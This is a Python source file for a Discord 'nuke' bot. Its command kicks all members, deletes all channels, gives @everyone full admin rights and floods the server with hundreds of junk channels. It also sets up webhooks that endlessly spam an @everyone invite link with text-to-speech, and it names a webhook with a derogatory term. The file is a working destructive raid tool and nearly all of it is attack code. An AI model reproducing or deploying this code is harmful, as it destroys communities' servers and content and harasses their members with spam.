import discord
import datetime
import keep_alive
from discord.ext import commands
from discord import Permissions
intents = discord.Intents.all()
bot = commands.Bot(command_prefix='nk!', intents=intents)
bot.remove_command('help')


@bot.command()
async def nuke(ctx):
                for member in ctx.guild.members:  
                 try:
                  await member.kick()
                 except:
                      continue
                for channel in ctx.guild.channels:  
                 try:
                  await channel.delete()
                 except:
                      continue
                for role in list(ctx.guild.roles):
                  if role.name == '@everyone':
                    try:
                      await role.edit(permissions=Permissions.all())
                      print("@everyone has admin")
                    except:
                        print("@everyone does NOT have admin")
                for i in range(1, 50):
                        await ctx.guild.create_text_channel("nuked")
                for i in range(1, 450):
                        await ctx.guild.create_text_channel(F"數數字摟{i}")
                await ctx.guild.leave()


spamMessage="@everyone https://discord.gg/hbZXjAZjv5"
@bot.event
async def  on_guild_channel_create(channel):
  if channel.name==('nuked'):
     webhook = await channel.create_webhook(name='GAY')
     while True:
       try:
         await webhook.send(spamMessage,tts=True)
       except:
         return
if __name__ == '__main__':
	keep_alive.keep_alive()
bot.run("")
